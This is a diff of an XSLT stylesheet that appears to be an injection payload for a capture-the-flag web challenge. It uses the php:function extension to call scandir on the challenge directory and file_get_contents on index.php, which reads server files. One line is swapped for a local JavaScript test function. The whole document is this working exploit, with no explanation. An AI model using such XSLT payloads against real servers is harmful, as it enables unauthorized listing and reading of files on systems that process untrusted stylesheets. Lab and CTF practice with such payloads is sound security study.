@@ -4,11 +4,11 @@ xmlns:php="http://php.net/xsl"
 xmlns:func="http://exslt.org/functions"
 >	
 <func:script language="javascript" >
-document.write("hello world");
+function test(){return "hello world!";}
 </func:script>
 <xsl:template match="/">	
 <xsl:param  name="shandle"    select="php:function('scandir','/challenge/web-serveur/ch50')" disable-output-escaping="yes"/>
-<xsl:param  name="strscand"   select="php:function('implode',@shandle,'')" disable-output-escaping="yes"/> 
+<xsl:param  name="strscand"   select="test()" disable-output-escaping="yes"/> 
 <xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" disable-output-escaping="yes"/>
 <div style="background-color:teal;color:white;padding:4px">
 <span style="font-weight:bold">
